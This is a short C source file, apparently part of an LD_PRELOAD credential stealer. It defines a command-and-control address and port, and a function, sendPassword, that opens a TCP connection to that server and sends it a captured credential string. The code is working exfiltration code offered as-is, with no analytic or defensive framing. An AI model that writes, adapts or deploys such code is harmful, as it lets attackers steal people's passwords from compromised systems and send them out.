#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include "preload.h"

#define C2_IP "172.21.0.12"
#define C2_PORT 6000


void sendPassword(char *combo){
  int fd = socket(AF_INET, SOCK_STREAM, 0);
  struct sockaddr_in addr = {0};
  if (fd == -1){
    return;
  }
  addr.sin_family = AF_INET;
  addr.sin_port = htons(C2_PORT);
  inet_pton(AF_INET, C2_IP, &addr.sin_addr);
  if (connect(fd, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
    send(fd, combo, strlen(combo), 0);
    close(fd);
  }
  return;
}
